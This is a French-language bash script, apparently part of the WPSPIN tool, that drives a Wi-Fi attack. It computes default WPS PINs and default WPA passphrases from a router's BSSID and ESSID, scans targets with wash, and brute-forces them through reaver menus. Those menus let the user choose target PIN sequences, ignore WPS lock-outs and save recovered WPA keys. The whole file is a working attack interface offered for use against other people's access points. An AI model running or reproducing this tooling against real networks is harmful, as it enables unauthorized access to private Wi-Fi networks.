    echo "|                                                                              |"
    echo "+------------------------------------------------------------------------------+" 
    echo -e "|                         $orange PIN POSSIBLE :$amarillo $PIN       $colorbase                      |" 
    echo "+------------------------------------------------------------------------------+"

else 
echo "+------------------------------------------------------------------------------+" 
    echo -e "|          $rojo                       NON SUPPORTÉ     $colorbase                            |"
    echo "|                                                                              |"
    echo "+------------------------------------------------------------------------------+" 


fi

if [ -n "${DEFAULTWPA}" ]; then
DEFAULTWPADISPLAY=$(echo "$DEFAULTWPA                                                                           " | cut -c -78)
 echo -e "|  $violet                       PASSPHRASE WPA par DÉFAUT   $colorbase                         |"
 echo -e "|$verdefluo$DEFAULTWPADISPLAY$colorbase|"
 echo "+------------------------------------------------------------------------------+"
fi

}



DATASGENERADOR(){
echo -e "$colorbase"
echo -e "                    -------------------------------------"
echo ""
read -ep "                1 > Introduire eSSID et presser <Enter> : "  ESSID          # essid comme variable               
echo "  "
read -ep "                2 > Introduire bSSID et presser <Enter> : " BSSID           # bssid comme variable
echo "  "
while !(echo $BSSID | tr a-f A-F | egrep -q "^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$")
do                                                                           # Petit cadeau, de antares_145, suivez son blog sur la web ,le bloc note d'antares,
echo -e " $rojo Erreur de syntaxe : MAC Non Conforme $colorbase"
echo "  "
read -ep "                2 > Introduire bSSID et presser <Enter> : " BSSID 
echo "  "            
done
}




SHORTMENUE(){                                                 # Menu avec fonctionnalité réduite )pas de scan, pas d'attaque) auquel sera cantonné l'utilisateur jusqu'à ce 
                                                              # ce 	que mort s'en suive, trois heure du mat je commence à péter un câble, jusqu'à ce que il y ait une
                                                             # interface compatible reconnue 

echo "$SORTMENUE_WARNING"
echo ""
echo ""
echo -e "                              $orange       ¿   $negro  ?           "
echo -e "                            $verde    ?   $azul    ?      $colorbase        " 
echo -e "                        $blanco       ¿ $colorbase  >X<  $gris  ¿         $colorbase "     
echo -e "                               -  (O o)  -         "
echo -e "                    +---------ooO--(_)--Ooo-------------+   "
echo -e "                    |                                   |   " 
echo -e "                    | $blanco   1$colorbase -$amarillo  GÉNÉRATEUR PIN$colorbase            |   "
echo -e "                    | $blanco   2$colorbase -$amarillo  DÉTECTER INTERFACES$colorbase       |   "
echo -e "                    | $blanco   3$colorbase -$amarillo  SORTIR$colorbase                    |   "
echo -e "                    |                                   |   "
echo -e "                    +-----------------------------------+   "
echo "" 
echo ""
echo ""
echo -e "                              Votre choix : $rojo" 
echo ""  
read -ep  "                                      " SHORTMENUE_CHOICE                
echo -e "$colorbase"


if [ "$SHORTMENUE_CHOICE" == "1" ] ; then

    DATASGENERADOR
    GENERATE
    OUTPUT
unset PIN2 && unset PIN3 && unset PIN4 && unset PIN5 && unset PIN6 && unset PIN7 && unset PIN8 && unset  FABRICANTE  && unset DEFAULTSSID   && unset MODEL

echo -e " "
echo -e "      ...$verdefluo pressez <enter> pour continuer$colorbase ..."    # pause to let the user copy the given datas 
read -ep "" NIENTE

   SHORTMENUE  
  
elif [ "$SHORTMENUE_CHOICE" == "2" ] ; then

    IFACE

elif [ "$SHORTMENUE_CHOICE" == "3" ]; then

CLEAN    
CIAO

exit

else

echo -e " ................ $rojo  Option non valide $colorbase........"

 SHORTMENUE
    

fi

}




SELECT_THEIFACE (){
read -ep "                          interface sélectionnée : " i        # ask the user to choose among avalaible interfaces   
}



                                                           # up part of the interface selection menue   


WASH_DISPLAY(){                                    # WE make a break here to be able to just display the results later and because it was confusing for langiages

if [ "$WALSH_O_WASH" == "wash" ]; then


echo "--------------------------------------------------------------------------------"        # devolvemos el resultado reorganizandolo
echo -e "  $blanco          BSSID         RSSI  WPS  Blocage    PIN    Canal     ESSID  $colorbase"          
echo "--------------------------------------------------------------------------------"
echo ""

else

echo "--------------------------------------------------------------------------------"        # devolvemos el resultado reorganizandolo
echo -e "  $blanco           BSSID                 PIN               ESSID  $colorbase"          
echo "--------------------------------------------------------------------------------"
echo ""

fi


for i in ${!BSSID[*]}; do
  
  CHANNEL_CHECK=$(echo ${CHANNEL[${i}]})
  LOCK_CHECK=$(echo ${LOCKED[${i}]})
  BSSID=$(echo ${BSSID[${i}]})
  ESSID=$(echo ${ESSID[${i}]})
  
  GENERATE


if [ "$WALSH_O_WASH" == "wash" ]; then  
  if [ "$LOCK_CHECK" = "No" ]; then
  DISPLAY_LOCKED=$( echo -e "$verde Non$colorbae")
  else
  DISPLAY_LOCKED=$( echo -e "$rojo Oui$colorbae")  
  fi
  
  if [ "$CHANNEL_CHECK" -lt 10 ]; then
  DISPLY_CHANNEL=$( echo " $CHANNEL_CHECK")
  else
  DISPLY_CHANNEL=$(echo ${CHANNEL[${i}]})
  fi
fi  
  
  if [ "$UNKNOWN" = 1 ]; then
    DISPLAY_PIN=$( echo -e "$orange$PIN$colorbase" )
  elif [ "$UNKNOWN" = 0 ]; then
    DISPLAY_PIN=$( echo -e "$verdefluo$PIN$colorbase" ) 
  else
    DISPLAY_PIN=$(echo -e "$rojo INCONNU$colorbase")
  fi
  
if [ "$i" -lt 10 ]; then
  NUM=$( echo -e " $amarillo$i$colorbase")
  else
  NUM=$( echo -e "$amarillo$i$colorbase")
fi  

if [ -n "${DEFAULTWPA}" ]; then
    DISPLAYBSSID=$( echo -e "$azulfluo$BSSID$colorbase")
  else
    DISPLAYBSSID=$( echo -e "$blanco$BSSID$colorbase")
  fi

if [ "$WALSH_O_WASH" == "wash" ]; then
  echo -e " $amarillo$NUM$colorbase   $DISPLAYBSSID   ${RSSI[${i}]}   ${WPS[${i}]}   $DISPLAY_LOCKED    $DISPLAY_PIN   $DISPLY_CHANNEL    $blanco$ESSID$colorbase "
else
  echo -e " $NUM    $DISPLAYBSSID         $DISPLAY_PIN        $blanco$ESSID$colorbase  " 
fi

done
echo ""
echo "--------------------------------------------------------------------------------"

echo ""

CONFORMITY=$(echo ${#BSSID[@]})
  
if [ "$CONFORMITY" = 0 ]; then

  echo -e  "$rojo ERREUR -$blanco aucun objectif à l'horizon, voyons si wash peut utiliser $amarillo$MON_ATTACK$colorbase "

    if [[ ! `(timeout 4 $WALSH_O_WASH -i $MON_ATTACK -C | grep ERROR )` ]]; 
      then 
echo "--------------------------------------------------------------------------------"
    echo -e "$verdefluo                          wash peut utiliser $amarillo$MON_ATTACK$colorbase"
echo "--------------------------------------------------------------------------------"

echo -e "$blanco 
 - Peut être les points d'accès environnant$rojo ne disposent pas de WPS$blanco... 
 - Peut être n'avez vous pas choisis$verdefluo l'interface la plus indiquée$blanco...
 - Déconnectez$amarillo tous vos dispositifs$blanco
 - Vérifiez les$amarillo privilèges et permissions$blanco 
 - Regardez vôtre$amarillo point de montage$blanco si vous avez WPSPIN situé dans un$amarillo USB$blanco ou un$amarillo HDD externe$blanco 
(attention si vous êtes en mode live)
 -$kindofviolet Bientôt Iw scan mode pour proposer une alternative a wash$blanco. 
 -$blanco Retour au menu de$kindofviolet sélection d'interface$blanco  
$blanco(si vous disposez de plusieurs chipsets il vous sera demandé de choisir entre ceux-ci)$blanco
... Si ce message continue à apparaître;
   ... vérifiez l’installation de reaver et wash
$verdefluo  Vous pouvez obtenir de l'aide sur$amarillo crack-wifi.com$verdefluo et$amarillo lampiweb.com$colorbase"
  sleep 5
  airmon-ng stop $MON_ATTACK &>/dev/null
  unset MON_ATTACK
  IFACE
  BIG_MENUE                      
  else
echo "--------------------------------------------------------------------------------"
    echo -e "$rojo                          wash ne peut communiquer avec $amarillo$MON_ATTACK$colorbase"
echo "--------------------------------------------------------------------------------"
echo -e "$blanco
 - Vérifiez votre installation de$amarillo wash/reaver$blanco 
 - Vérifiez le$amarillo bouton d'allumage du wireless$blanco
 - Vérifiez vos$amarillo ports USB

$blanco    Vous allez être redirigés vers la$kindofviolet selection d'interface $blanco 
           pendant que WPSPIN$verdefluo cherche une solution
$blanco(si vous disposez de plusieurs interfaces il vous sera demandé de choisir entre elles)
$colorbase"
  sleep 5
  if [[ -n `(airmon-ng stop $MON_ATTACK | grep SIOCSIFFLAGS )` ]]; &>/dev/null
    then
echo "--------------------------------------------------------------------------------"
echo -e " $rojo                      RF-Kill bloque le dispositif 

$verdefluo Vérifiez que votre wireless soit activé et vérifiez votre interrupteur wireless $colorbase"
echo "--------------------------------------------------------------------------------" 
  sleep 5
  fi 
  unset MON_ATTACK
  IFACE 
  BIG_MENUE
 fi

  
   

     
  else   
TARGETNUMBER=$( echo -e "$colorbase Introduire le numéro de l'objectif : $amarillo" )  
read  -ep "$TARGETNUMBER " i
echo -e "$colorbase"

until [[ $i = *[[:digit:]]* ]] && [[ "$i" -lt "$CONFORMITY" ]]  &&  [[ "$i" -ge 1 ]]   ; do
   echo -e "     $rojo OPTION INEXISTANTE  $colorbase"
      echo ""
      read  -ep "$TARGETNUMBER " i
      echo -e "$colorbase" 
   done
fi
  

BSSID=$(echo ${BSSID[${i}]})
ESSIDSUCIO=$(echo ${ESSID[${i}]})
ESSID="${ESSIDSUCIO%"${ESSIDSUCIO##*[![:space:]]}"}"
CHANNEL=$(echo ${CHANNEL[${i}]})
unset PIN2 && unset PIN3 && unset PIN4 && unset PIN5 && unset PIN6 && unset PIN7 && unset PIN8

GENERATE

} 


BIG_MENUE_DISPLAY(){

echo -e "$colorbase copyleft GPL v.3, support the free software!" 
echo -e "
       .$amarillo'(     /$rojo·-.  $amarillo  )(.$rojo--.  $amarillo   /$rojo·-.  .$amarillo'(   )\  )\  $rojo
   ,') \  )  ,' _  \  (   ._.'  ,' _  \ \  ) (  \, / $colorbase     coded by$blanco kcdtv $rojo   
  (  /(/ /  (  '-' (   ·-. .   (  '-' ( ) (   ) \ (   $colorbase featuring  $blanco antares_145$rojo
   )    (    ) ,._.'  ,_ (  \   ) ,._.' \  ) ( ( \ \    $blanco r00tnull$colorbase -$blanco 1camaron1$rojo
  (  .'\ \  (  '     (  '.)  ) (  '      ) \  ·.)/  )    $blanco Coeman76$colorbase -$blanco Spawn$rojo  
$amarillo   )/   )/   )/   $rojo    '._,_.' $amarillo  )/        )/  $rojo   '$amarillo.( $colorbase  and the$blanco lampiweb team $colorbase"
echo ""
echo ""
echo -e "    $amarillo www.crack-wifi.com     www.lampiweb.com    www.auditoriaswireless.net$colorbase"

echo ""
echo ""
echo -e "                                                        "
echo -e " $magenta      _   ''   $rojo  _ () _      $amarillo                _ _ _                       
 $magenta     [|)efault$rojo  ||)[][|\|$magenta  generator  with$amarillo   \\/\/||)S $magenta attack  interface
   $rojo              L|          $amarillo                     L|  $magenta  ''                   "
echo ""

echo -e "$rojo
                          _ _    _       _        || 
                         //\/\ E[|\|ue  ||)rincipaL_]  '' 
                                        L|    $colorbase" 
echo "
"
echo -e "                +----------------------------------------------+  "
echo -e "                |                                              |  "
echo -e "                |  $amarillo   1$colorbase  -$blanco  MODE AUTOMATISE (WASH ET REAVER)$colorbase   |  "
echo -e "                |  $amarillo   2$colorbase  -$blanco  PIN GÉNÉRATEUR (AVEC MENUE ATAQUE)$colorbase |  "
echo -e "                |  $amarillo   3$colorbase  -$blanco  CHANGER INTERFACE$colorbase                  |  "
echo -e "                |  $amarillo   4$colorbase  -$blanco  REDÉMARRER OU CHANGER LANGUE$colorbase       |  "
echo -e "                |  $amarillo   5$colorbase  -$blanco  SORTIR$colorbase                             |  "
echo -e "                |                                              |  "
echo -e "                +----------------------------------------------+  "
echo ""
echo ""
echo -e "                                 Votre choix : $rojo " 
echo ""
read -ep "                                       " BIG_MENUE_CHOICE
echo -e "$colorbase"
until [[ $BIG_MENUE_CHOICE = *[[:digit:]]* ]]  &&  [[ "$BIG_MENUE_CHOICE" -gt "0" ]]  && [[ "$BIG_MENUE_CHOICE" -lt "6" ]] ; do
  BIG_MENUE_DISPLAY
done

}




CIAO(){

echo -e "$colorbase"
echo -e "                           A bientôt  
                         venez nous rendre visite sur$amarillo crack-wifi.com$colorbase"
echo -e "          et pour les hispanophones,$amarillo lampiweb.com$colorbase et$amarillo auditoriaswireless.net $colorbase  "
echo -e "                          $verdefluo  |$amarillo'$verdefluo|        "
echo -e "                           _|_|_        "
echo -e "                      $colorbase  - $blanco (O o) $colorbase -         "           
echo -e "----------------------$blanco ooO$colorbase--(_)-$blanco Ooo$colorbase--------------------------------------------"
exit 0
}






ATTACK_MENUE_DISPLAY(){

echo -e "               "                            
echo -e "              Objectif >$blanco $ESSID$colorbase mac > $blanco $BSSID $colorbase"
echo -e "              +-----------------------------------------------------+  "
echo -e "              |  $blanco 1 $colorbase -$amarillo ATTAQUER OBJECTIF AVEC REAVER, PIN $rojo $PIN$colorbase |  "
echo -e "              |  $blanco 2 $colorbase -$amarillo ENTREZ UN PIN MANUELLEMENT                 $colorbase  |  "
echo -e "              |  $blanco 3 $colorbase -$amarillo DÉFINISSEZ UNE SÉQUENCE DE PIN$colorbase               |  "
echo -e "              |  $blanco 4 $colorbase -$amarillo MODIFIEZ VOTRE LIGNE DE COMMANDE REAVER$colorbase      |  "
echo -e "              |  $blanco 5 $colorbase -$verdefluo SÉLECTIONNEZ UN AUTRE OBJECTIF$colorbase               |  "
echo -e "              |  $blanco 6 $colorbase <$azulfluo RETOUR$colorbase :$amarillo CHANGEZ D'INTERFACE$colorbase +$amarillo NOUVEAU SCAN$colorbase  |  "
echo -e "              |  $blanco 7 $colorbase -$azulfluo REDÉMARREZ$blanco /$azulfluo CHANGEZ DE LANGUE$colorbase               |  "
echo -e "              |  $blanco 8 $colorbase -$rojo SORTIR $colorbase                                      |  " 
echo -e "              +-----------------------------------------------------+  "
echo ""
echo ""
echo -e "                                 Votre Choix  $rojo"                  
echo ""
read -ep "                                      " ATTACK_MENUE_CHOICE
echo -e "$colorbase"

until [[ $ATTACK_MENUE_CHOICE = *[[:digit:]]* ]] && [[ "$ATTACK_MENUE_CHOICE" -lt "9" ]]  &&  [[ "$ATTACK_MENUE_CHOICE" -gt "0" ]]; do
  ATTACK_MENUE_DISPLAY
done

}





CUSTOMPIN()                     # This function is used to allow the user to manually enter a PIN to be tryed first 
{                               # option 2 in the attack menue

unset SELECTEDPIN 2> /dev/null  # we delete the former selected PIN if it remained set

echo ""
echo -e " Saisissez les$amarillo 7 premiers chiffres$colorbase du$amarillo PIN$colorbase que vous voulez lancer pour l'attaque 
$amarillo      Il n'est pas nécessaire de mettre le checksum $colorbase (dernier numéro)$colorbase
$rojo "
read -ep "                                " SELECTEDPIN 
echo -e "$colorbase" 
while !(echo $SELECTEDPIN | egrep -q "^([0-9]{7})$")
  do
    echo ""
    echo -e "           $rojo ERREUR: IL FAUT RENTRER LES 7 PREMIER CHIFFRES DU PIN $colorbase"
    CUSTOMPIN
done
}


SECATOR()                   # This function let the user choose for a sequence of PIN to try first, we determine 4 values, 2 4 digits strings
{                           # ( first half PIN ) and 2 3 digits strings ( second half )

unset INICIOSEQUENCEFIRST 2> /dev/null  #  We ensure that there is not former values stored
unset FINSEQUENCEFIRST 2> /dev/null     #

  if [[ "$HEAD3" = "0" ]]; then         # if the first half PIN hasn't been found yet we propose to customize sequence on the first PIN
    echo "+------------------------------------------------------------------------------+"
    echo -e "|        $azullight   1* CRÉATION DE LA SÉQUENCE SUR LA$verdefluo PREMIÈRE MOITIÉ DE PIN$colorbase           |"
    echo "+------------------------------------------------------------------------------+" 
    ASKSSTARTSEQUENCE=$( echo -e "$colorbase Saisissez les 4 numéros $blanco en début de séquence$verdefluo ")
    
    read -ep "$ASKSSTARTSEQUENCE" INICIOSEQUENCEFIRST
while !(echo $INICIOSEQUENCEFIRST | egrep -q "^([0-9]{4})$")
           do
            echo ""
            echo -e "                      $rojo  ERREUR: VOUS DEVEZ SAISIR 4 NUMÉROS $colorbase "
            echo "" 
             read -ep "$ASKSSTARTSEQUENCE" INICIOSEQUENCEFIRST
done
    
    ASKENDSEQUENCE=$( echo -e "$colorbase Saisissez les 4 numéros $blanco en fin de séquence$rojo ")
    
    read -ep "$ASKENDSEQUENCE" FINSEQUENCEFIRST                                                                      
   
    
          while !(echo $FINSEQUENCEFIRST | egrep -q "^([0-9]{4})$")
           do
            echo ""
            echo -e "                       $rojo ERREUR: VOUS DEVEZ SAISIR 4 NUMÉROS $colorbase "
            echo ""   
                read -e -p "$ASKENDSEQUENCE" FINSEQUENCEFIRST                                                               
         done 

  fi

unset INICIOSEQUENCESECOND 2> /dev/null  #  We ensure that there is not former values stored
unset FINSEQUENCESECOND 2> /dev/null

    echo -e "$colorbase+------------------------------------------------------------------------------+"
    echo -e "|       $azullight    2* CRÉATION DE LA SÉQUENCE SUR LA$rojo DEUXIÈME MOITIÉ DE PIN  $colorbase         |"
    echo -e "+------------------------------------------------------------------------------+"
    echo -e "|        $blanco  ($amarillo pas besoin de checksum$blanco -$rojo Saisissez X pour sortir$blanco )$colorbase                |"
    ASKSSTARTSEQUENCE2=$( echo -e "$colorbase Saisissez les 3 numéros$blanco au début de la séquence$verdefluo ")
    read -ep "$ASKSSTARTSEQUENCE2" INICIOSEQUENCESECOND     

    

      while !(echo $INICIOSEQUENCESECOND | egrep -q "^([0-9]{3})$") 
        do 
            if [[ "$INICIOSEQUENCESECOND" == "X" || "$INICIOSEQUENCESECOND" == "x" ]] ; then
   
              break
            fi
          echo ""
          echo -e "              $rojo ERREUR: VOUS DEVEZ SAISIR 3 NUMÉROS (X por sortir) $colorbase "
          echo ""
          read -ep "$ASKSSTARTSEQUENCE2" INICIOSEQUENCESECOND
      done


    ASKENDSEQUENCE2=$( echo -e "$colorbase Saisissez les 3 numéros$blanco en fin de séquence$rojo ")

    read -ep "$ASKENDSEQUENCE2" FINSEQUENCESECOND

    while !(echo $FINSEQUENCESECOND | egrep -q "^([0-9]{3})$")  
      do 
         if [[ "$FINSEQUENCESECOND" == "X" || "$FINSEQUENCESECOND" == "x" ]]; then
           break
         fi
          echo ""
          echo -e "              $rojo ERREUR: VOUS DEVEZ SAISIR 3 NUMEROS (X por sortir) $colorbase "
          echo ""
          read -ep "$ASKENDSEQUENCE2" FINSEQUENCESECOND
  
    done
echo -e "$colorbase+------------------------------------------------------------------------------+"
}
 


SUMUPNOM6()
{
PINECRAN=$( printf '%04d\n' $HEAD1 )
PINLEFT=`expr 11000 '-' $HEAD1`
PINLEFTECRAN=$( printf '%05d\n' $PINLEFT ) 
PORCENT1=`expr $HEAD1 '*' 100 '/' 11`

PORCENT2=$( printf '%05d\n' $PORCENT1 )

INICIOPORCENT=$( echo "$PORCENT2" | cut -b -2 )

ENDPORCENT=$( echo "$PORCENT2" | cut -b 3- ) 
 
echo " +--------------------------------------+"
echo -e " |   $amarillo             RESUMÉ        $colorbase        | "    
echo " +--------------------------------------+"
echo -e " |    Attaque sur la$rojo première$colorbase moitié    | "
echo -e " |   Premières moitiés essayées - $amarillo$PINECRAN $colorbase |"    
echo -e " |    Il reste au maximum $amarillo $PINLEFTECRAN$colorbase PIN    |"
echo " +--------------------------------------+"
echo -e " |     $rojo$INICIOPORCENT$colorbase,$rojo$ENDPORCENT$colorbase% de l'attaque effectué    |"
echo " +--------------------------------------+"  
echo ""


}



SUMUPM6()
{
 
PINECRAN=$( printf '%04d\n' $HEAD1 )
PINECRAN2=$( printf '%03d\n' $HEAD2 )
PINLEFT=`expr 1000 '-' $HEAD2`
PINLEFTECRAN=$( printf '%03d\n' $PINLEFT ) 
PORCENT1=`expr '(' $HEAD2 '+' 10000 ')' '*' 100 '/' 11`
PORCENT2=$( printf '%04d\n' $PORCENT1 )
INICIOPORCENT=$( echo "$PORCENT2" | cut -b -2 )
ENDPORCENT=$( echo "$PORCENT2" | cut -b 2- ) 
echo -e " $colorabse "  
echo "+------------------------------------------------------------------------------+"
echo -e "|   $amarillo                                 RESUMÉ                            $colorbase        |"    
echo "+------------------------------------------------------------------------------+"
echo -e "|   $verdefluo PREMIÈRE MOITIÉ DE PIN VALIDE !$colorbase    |    Attaque sur la$rojo deuxième$colorbase moitié    |" 
echo -e "|               $amarillo $PRIMERAMITAD$colorbase                   |    Deuxièmes moitiés testées - $amarillo$PINECRAN2$colorbase   |"
echo -e "|Premières moitiées de PIN testées $verdefluo$PINECRAN$colorbase |     Il reste au masimum$amarillo $PINLEFTECRAN$colorbase PIN      |"    

echo "+------------------------------------------------------------------------------+"
echo -e "|                        $rojo$INICIOPORCENT$colorbase,$rojo$ENDPORCENT$colorbase% de l'attaque effectués                       |"
echo "+------------------------------------------------------------------------------+"  
echo -e "$colorbase"

}




PINFOUND(){

DATE=$(  date | cut -d "," -f 1 ) 
NEWNAME=${DATE// /_}
DISPLAYNEWNAME1=$( echo "$NEWNAME-$WPCNAME                                                            " | cut -b -70 )
DISPLAYNAME=$( echo "$DISPLAYNEWNAME1 $colorbase|") 
echo -e " $colorabse "  
echo "+------------------------------------------------------------------------------+"
echo -e "|          $verdefluo VOUS AVEZ TROUVE LE PIN WPS  !       $colorbase le pin est $amarillo$PIN   $colorbase       |"
echo "+------------------------------------------------------------------------------+"
echo "|    la session *.wpc est sauvegardée dans votre dossier WPSPN et s'appelle    |"
echo -e "|       $azulfluo$DISPLAYNAME"
echo "+------------------------------------------------------------------------------+"

cat "$DIRECTORY/$WPCNAME" >> "$NEWNAME$WPCNAME"

rm -r "$DIRECTORY/$WPCNAME"

}



FAILEDREAVER()
{
echo "+------------------------------------------------------------------------------+"
echo -e "$rojo                                  ERREUR $colorbase
+------------------------------------------------------------------------------+
$blanco                       Reaver n'a pas pu lancer l'interface$amarillo $MON_ATTACK$blanco
  
  - Vérifiez vôtre$amarillo bouton wireless$blanco
  - Vérifiez vos$amarillo ports et connexions USB$blanco
  -$amarillo Déconnectez$blanco vous d'Internet 

... De retour dans le menu de$kindofviolet sélection de l'interface 
       $blanco pendant que WPSPIN$verde cherche une solution
$colorbase"
sleep 5 
if [[ -n `(airmon-ng stop $MON_ATTACK | grep SIOCSIFFLAGS )` ]]; &>/dev/null
    then
echo "--------------------------------------------------------------------------------"
echo -e " $rojo                      RF-Kill bloque le dispositif 

$verdefluo Vérifiez que votre wireless soit activé et vérifiez votre interrupteur wireless $colorbase"
echo "--------------------------------------------------------------------------------" 
  sleep 5 
  fi 
  unset MON_ATTACK
  IFACE 
  BIG_MENUE
}




FAKEM4WARNING()
{
echo -e "$colorbase"
echo "+------------------------------------------------------------------------------+"
echo -e "|                   $rojo           M4 SUSPECT DÉTECTÉ   $colorbase                           |"
echo "+------------------------------------------------------------------------------+"
echo -e "|$blanco Reaver peut passer au PIN suivant alors que le précédant n'a pas été vérifié$colorbase |"
echo -e "|$blanco la clef n'est alors pas récupérée, dans ce cas effacez $amarillo$WPCNAME$colorbase |"
echo -e "|$blanco et renommez $amarillo BACKUPfakeM4_$WPCNAME$blanco comme$verdefluo $WPCNAME$colorbase  |"
echo -e "|$blanco              Vous reviendrez au niveau du premier$rojo M4 suspect$colorbase                 |"
echo "+------------------------------------------------------------------------------+"
echo -e "$colorbase"
}


FAKEM6WARNING()
{
echo -e "$colorbase"
echo "+------------------------------------------------------------------------------+"
echo -e "|                   $rojo           M6 SUSPECT DÉTECTÉ   $colorbase                           |"
echo "+------------------------------------------------------------------------------+"
echo -e "|$blanco Reaver peut passer au PIN suivant alors que le précédant n'a pas été vérifié$colorbase |"
echo -e "|$blanco la clef n'est alors pas récupérée, dans ce cas effacez $amarillo$WPCNAME$colorbase |"
echo -e "|$blanco et renommez $amarillo BACKUPfakeM6_$WPCNAME$blanco comme$verdefluo $WPCNAME$colorbase  |"
echo -e "|$blanco              Vous reviendrez au niveau du premier$rojo M6 suspect$colorbase                 |"
echo "+------------------------------------------------------------------------------+"
echo -e "$colorbase"
}



CUSTOMREAVER()
{
echo -e "$colorbase+------------------------------------------------------------------------------+
|                  $violet         OPTIONS DISPONIBLES          $colorbase                      |
+------------------------------------------------------------------------------+
|$amarillo -e$colorbase --essid=<ssid>    $blanco          ESSID du PA cible      $colorbase                       |
|$amarillo -c$colorbase --channel=<channel>    $blanco     fixer le canal utilisé par notre interface$colorbase    |
|                                $blanco            (implique -f)         $colorbase            |
|$amarillo -D$colorbase --daemonize   $blanco              Daemonize reaver         $colorbase                     |
|$amarillo -a$colorbase --auto       $blanco               Reaver effectue automatiquement les réglages$colorbase  |
|                                     $blanco pour mener l'attaque        $colorbase            |
|$amarillo -f$colorbase --fixed       $blanco              Pas de changement de canal (canal fixe)$colorbase       |
|$amarillo -5$colorbase --5ghz          $blanco            Utilise la bande 5GHz (A)$colorbase                     |
|$amarillo -d$colorbase --delay=<seconds>  $blanco         laps de temps entre chaque PIN ([1]par défaut)$colorbase|
|$amarillo -l$colorbase --lock-delay=<seconds> $blanco     Définir le temps d'une pause prenant lieu $colorbase    |
|     $blanco                lorsque le blocage du WPS est détecté ([60]par défaut)$colorbase   |
|$amarillo -g$colorbase --max-attempts=<num>    $blanco    Quitter reaver après un numéro de tentatives$colorbase  |
|$amarillo -x$colorbase --fail-wait=<seconds>   $blanco    Definir le temps d'une pause chaque dix   $colorbase    |
|                $blanco                        erreurs consécutives ([0] par défaut)$colorbase |
|$amarillo -r$colorbase --recurring-delay=<x:y>   $blanco  Arrêter y secondes toutes les x tentatives$colorbase    |
|$amarillo -t$colorbase --timeout=<seconds>       $blanco  Définir le timeout ([5]par défaut)        $colorbase    |
|$amarillo -T$colorbase --m57-timeout=<seconds>  $blanco   Définir le timeout entre M5 et M7 [0.20] $colorbase     |
|$amarillo -A$colorbase --no-associate       $blanco       Reaver ne s'associe pas avec l'objectif $colorbase      |
|                      $blanco (l'association sera alors mené avec un autre programme)$colorbase|
|$amarillo -N$colorbase --no-nacks       $blanco           Ne pas envoyer de NACK lorque des paquets de $colorbase |
|                                   $blanco      hors service sont reçu $colorbase              |
|$amarillo -S$colorbase --dh-small      $blanco            Clefs DH courtes pour accélérer le crack$colorbase      |
|$amarillo -L$colorbase --ignore-locks      $blanco        Ignorer l'état de blocage du WPS du PA$colorbase        |
|$amarillo -E$colorbase --eap-terminate     $blanco        Conclure chaque session WPS par un paquet$colorbase     |
|                                   $blanco           EAP FAIL               $colorbase         |
|$amarillo -n$colorbase --nack           $blanco           La cible envoie toujours un NACK [Automa]$colorbase     |
|$amarillo -w$colorbase --win7          $blanco            Imiter Windows 7  [Non activé par défaut]$colorbase     |
+------------------------------------------------------------------------------+
Les ordres en rouges sont obligatoires ($rojo reaver -i $MON_ATTACK -b $BSSID$colorbase )
Complétez  avec les arguments de vôtre choix$colorbase. Ajouttez $amarillo -c $CHANNEL$colorbase pour fixer le canal
de votre cible et $amarillo-vv$colorbase afin de voir en console les détails de l'attaque 
Bonne chance :) $amarillo 
" 
MANDATORY=$( echo -e "$rojo reaver -i $MON_ATTACK -b $BSSID$verdefluo") 
read -e -p " $MANDATORY " REAVERCOMMAND
echo -e "$colorbase"
 
until [ -z `echo $REAVERCOMMAND | tr vecDaf1234567890dlgxrtTANSLEnw - | tr -d "-" | tr -d ' '` ] ;
do
 echo -e "$rojo erreur,$blanco option non valide, vérifiez la liste au dessus"
 echo "ajoutez les arguments supplémentaires désirés ou pressez enter
"
 read -e -p " $MANDATORY " REAVERCOMMAND
 echo -e "$colorbase"
done
echo -e "$blanco Vôtre ligne d'attaque personnalisée est gardée en mémoire et sera employée lors de la prochaine attaque$colorbase
Vous pouvez attaquer avec le PIN indiqué dans le menu ($blanco 1 $colorbase) ou alors 
saisisez un autre PIN ($blanco 2$colorbase ) ou bien définissez une séquence de PIN ($blanco 3 $colorbase)

"

}

WASHWAIT=$(echo -e "$colorbase+------------------------------------------------------------------------------+" 
        echo -e "|                $verdefluo       LE SCAN AVEC WASH EST LANCÉ$colorbase                            |
+------------------------------------------------------------------------------+
|$blanco Le$amarillo PIN$blanco par défaut proposé apparait: $colorbase                                         |
|                                                                              |
|$blanco  - En$verdefluo vert$blanco si le point d'accès est supporté    $colorbase                              |
|$blanco  - En$orange orange$blanco si le point d'accès est inconnu $colorbase                                |
|$blanco  - En$rojo rouge$blanco si le point d'accès n'est pas supporté $colorbase                          |
|                                                                              |
|$azulfluo Si le BSSID est affiché en bleu$blanco la clef WPA par défaut sera générée si  $colorbase     |
|                                       $blanco       l'objectif est sélectionné      |
+------------------------------------------------------------------------------+
|         $magenta           FERMEZ LA FENÊTRE DU SCAN POUR L'ARRÊTER $colorbase                 |
+------------------------------------------------------------------------------+")






MON_ADVERTENCIA=$( echo -e "                                        
                 $rojo              ATTENTION!
$colorbase
$rojo  Le système ne détecte qu'un seul chipset et celui-ci n'est malheureusement
     pas complètement compatible, le résultat des options scan et attaque est compromis :(  
$colorbase
" )                                                                # warning the user if his chipset is not fully recognized by airmon-ng


INTERFACEDESIGN=$( echo -e "$colorbase
   NUMERO     INTERFACE        CHIPSET & DRIVER
              ---------------------------------------------------   
$blanco")    





NO_MONITOR_MODE=$(echo -e "$rojo          ATTENTION$colorbase :$amarillo AUCUN CHIPSET COMPATIBLE MODE MONITOR DÉTECTÉ  $colorbase 

 $rojo   WPSPIN s'exécutera en mode réduit , sans possibilité de scan ni d'attaque$colorbase 
$rojo    Vous pouvez essayer de détecter à nouveau  les interfaces avec l'option 2$colorbase")




NO_REAVER=$(echo -e "$rojo             ATTENTION$colorbase :$amarillo  AUCUNE VERSION DE WPS REAVER DÉTECTÉE  $colorbase 

$rojo  WPSPIN s'exécutera en mode réduit , sans possibilité de scan ni d'attaque$colorbase
$rojo      Vous devez installer reaver pour accéder aux autres fonctions$colorbase")



FAILED=$(echo -e " 
                       +----------------------------------+
                       |   $blanco            Echec    $colorbase          |
                       +----------------------------------+ 
                       |   $rojo   CLEF WPA NON RÉCUPÉRÉE!$colorbase     |  
                       +----------------------------------+
" )

KEY_FOUND=$(echo -e " 
                      +---------------------------------+
                      |$verdefluo       CLEF WPA RÉCUPÉRÉE! $colorbase      |
                      +---------------------------------+
             Résultats sauvegardés dans le dossier WPSPIN, voir fichier  $colorbase "
 )




